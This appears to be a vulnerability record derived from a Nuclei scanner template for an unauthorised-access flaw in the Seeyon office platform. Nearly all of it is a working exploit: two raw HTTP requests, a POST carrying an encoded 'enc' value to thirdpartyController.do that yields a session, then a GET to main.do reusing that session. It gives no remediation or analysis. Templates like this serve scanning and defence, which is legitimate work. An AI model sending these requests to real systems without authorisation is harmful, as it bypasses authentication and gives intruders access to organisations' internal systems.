# Vulnerability: Seeyon Unauthorised Access
**Classification:** MISCONFIG
**Source:** Nuclei Template (`seeyon-unauth.yaml`)

## Description
Seeyon is vulnerable to unauthorised access.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: deflate

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4

GET /seeyon/main.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: deflate
Content-Type: application/x-www-form-urlencoded
Cookie: {{session}}
```

